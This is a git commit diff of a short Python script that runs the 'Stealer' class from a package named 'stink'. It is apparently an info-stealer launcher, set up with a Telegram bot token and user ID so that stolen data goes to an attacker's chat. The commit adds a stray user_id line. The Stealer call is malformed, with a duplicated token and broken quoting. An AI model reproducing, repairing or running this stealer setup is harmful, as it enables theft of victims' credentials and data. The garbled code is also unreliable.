a412533a74147f8121c6d8f66a46597e5ddb2eab
skrillakilla <103787179+skrillakilla@users.noreply.github.com>
2022-12-23 00:11:03 +0000

    ww

--- stink/from stink import Stealer.py
+++ stink/from stink import Stealer.py
@@ -2,3 +2,4 @@ from stink import Stealer
 
 if __name__ == '__main__':
     Stealer(token=" 5927681660:AAGGdXLsN8YFx8j84S1ncQecgI5R00ojb 5927681660:AAGGdXLsN8YFx8j84S1ncQecgI5R00ojbng user_id=5327162295).run()
+user_id=5327162295 # type: ignore
